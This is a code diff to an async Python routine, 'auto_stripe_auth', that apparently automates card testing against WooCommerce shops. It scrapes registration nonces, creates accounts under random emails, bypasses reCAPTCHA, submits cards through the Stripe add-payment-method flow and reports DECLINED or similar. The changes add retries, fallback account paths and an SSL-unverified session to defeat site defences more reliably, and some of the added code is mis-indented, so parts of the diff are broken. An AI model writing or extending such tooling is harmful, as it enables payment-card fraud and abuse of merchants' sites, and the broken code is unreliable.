@@ -25,6 +25,13 @@ import aiohttp
 
 logger = logging.getLogger(__name__)
 
+# Retry: transient errors (404, 5xx, timeout, network, captcha) — no repeated high errors to user
+MAX_AUTH_RETRIES = 2  # 3 attempts total
+RETRY_DELAY_SEC = 1.5
+RETRIABLE_RESPONSES = frozenset({
+    "SITE_HTTP_ERROR", "SITE_ERROR", "CAPTCHA_BLOCK", "TIMEOUT", "NETWORK_ERROR", "ERROR",
+})
+
 # Common WooCommerce account path variants (order matters: try URL hint first, then common)
 ACCOUNT_PATH_CANDIDATES = [
     "/my-account/",
@@ -252,26 +259,64 @@ async def auto_stripe_auth(
     if session is None:
         session = aiohttp.ClientSession(timeout=timeout, connector=connector)
 
-    try:
-        # 0) Discover account path (my-account, account, customer-area, etc.)
-        account_prefix = await _discover_account_path(session, base, path_hint, headers_base, proxy)
-        if not account_prefix:
-            account_prefix = "/my-account/"
-        acc_path = account_prefix.strip("/")
-        account_url = f"{base}/{acc_path}/" if acc_path else f"{base}/"
-        referer_path = "/" + acc_path + "/" if acc_path else "/my-account/"
+    for attempt in range(MAX_AUTH_RETRIES + 1):
+        if attempt > 0:
+            if own_session and session:
+                await session.close()
+            session = aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False))
+            await asyncio.sleep(RETRY_DELAY_SEC)
 
-        # 1) GET account page → nonce
+        try:
+            # 0) Discover account path (my-account, account, customer-area, etc.)
+            account_prefix = await _discover_account_path(session, base, path_hint, headers_base, proxy)
+            if not account_prefix:
+                account_prefix = "/my-account/"
+            acc_path = account_prefix.strip("/")
+            account_url = f"{base}/{acc_path}/" if acc_path else f"{base}/"
+            referer_path = "/" + acc_path + "/" if acc_path else "/my-account/"
+
+            # 1) GET account page → nonce (if 404, try other account path candidates)
+        html_reg = None
+        resp_status = None
         async with session.get(
             account_url,
             headers=headers_base,
             proxy=proxy,
         ) as resp:
-            if resp.status != 200:
+            resp_status = resp.status
+            if resp.status == 200:
+                html_reg = await resp.text()
+        if resp_status != 200 or not html_reg:
+            # Fallback: try path_hint and other candidates so 404 on /my-account/ doesn't fail sites that use /account/ or /customer-area/
+            fallback_candidates = list(ACCOUNT_PATH_CANDIDATES)
+            if path_hint:
+                ph = path_hint if path_hint.endswith("/") else path_hint + "/"
+                if ph not in fallback_candidates:
+                    fallback_candidates.insert(0, ph)
+            for prefix in fallback_candidates:
+                prefix = prefix if prefix.endswith("/") else prefix + "/"
+                if prefix == account_prefix:
+                    continue
+                try_url = base.rstrip("/") + prefix
+                try:
+                    async with session.get(try_url, headers=headers_base, proxy=proxy) as resp2:
+                        if resp2.status == 200:
+                            html_reg = await resp2.text()
+                            if html_reg and _looks_like_woo_account(html_reg):
+                                account_url = try_url
+                                acc_path = prefix.strip("/")
+                                referer_path = prefix
+                                break
+                except Exception:
+                    continue
+            if not html_reg or not _looks_like_woo_account(html_reg):
                 result["response"] = "SITE_HTTP_ERROR"
-                result["message"] = f"Account page returned {resp.status}"
-                return result
-            html_reg = await resp.text()
+                result["message"] = f"Account page returned {resp_status or 404} (tried account paths; none returned WooCommerce)"
+                break
+        if not html_reg:
+            result["response"] = "SITE_HTTP_ERROR"
+            result["message"] = f"Account page returned {resp_status}"
+            break
 
         nonce_m = re.search(r'name=["\']woocommerce-register-nonce["\'][^>]+value=["\']([^"\']+)["\']', html_reg)
         if not nonce_m:
@@ -281,7 +326,7 @@ async def auto_stripe_auth(
         if not nonce_m:
             result["response"] = "SITE_ERROR"
             result["message"] = "Registration nonce not found"
-            return result
+            break
         reg_nonce = nonce_m.group(1)
 
         email = _random_email()
@@ -329,7 +374,7 @@ async def auto_stripe_auth(
             if _captcha_detected(html1) or ("registered" not in html1.lower() and "dashboard" not in html1.lower() and "logout" not in html1.lower()):
                 result["response"] = "CAPTCHA_BLOCK"
                 result["message"] = "Registration captcha failed"
-                return result
+                break
 
         await asyncio.sleep(0.3)
 
@@ -362,14 +407,14 @@ async def auto_stripe_auth(
         if not html_pay:
             result["response"] = "SITE_HTTP_ERROR"
             result["message"] = "add-payment-method page not found"
-            return result
+            break
 
         if _captcha_detected(html_pay):
             g_token = await _recaptcha_bypass(session, html_pay, add_pm_url or add_pm_candidates[0])
             if not g_token:
                 result["response"] = "CAPTCHA_BLOCK"
                 result["message"] = "Payment page captcha failed"
-                return result
+                break
             async with session.get(
                 add_pm_url or add_pm_candidates[0],
                 headers=pay_headers,
@@ -603,18 +648,22 @@ async def auto_stripe_auth(
                 result["response"] = "DECLINED"
                 result["message"] = ajax_text[:150]
             return result
-    except asyncio.TimeoutError:
-        result["response"] = "TIMEOUT"
-        result["message"] = "Request timed out"
+        except asyncio.TimeoutError:
+            result["response"] = "TIMEOUT"
+            result["message"] = "Request timed out"
+            break
+        except aiohttp.ClientError as e:
+            result["response"] = "NETWORK_ERROR"
+            result["message"] = str(e)[:80]
+            break
+        except Exception as e:
+            result["response"] = "ERROR"
+            result["message"] = str(e)[:100]
+            break
+        finally:
+            if own_session and session:
+                await session.close()
+        if attempt < MAX_AUTH_RETRIES and result.get("response") in RETRIABLE_RESPONSES:
+            continue
         return result
-    except aiohttp.ClientError as e:
-        result["response"] = "NETWORK_ERROR"
-        result["message"] = str(e)[:80]
-        return result
-    except Exception as e:
-        result["response"] = "ERROR"
-        result["message"] = str(e)[:100]
-        return result
-    finally:
-        if own_session and session:
-            await session.close()
+    return result
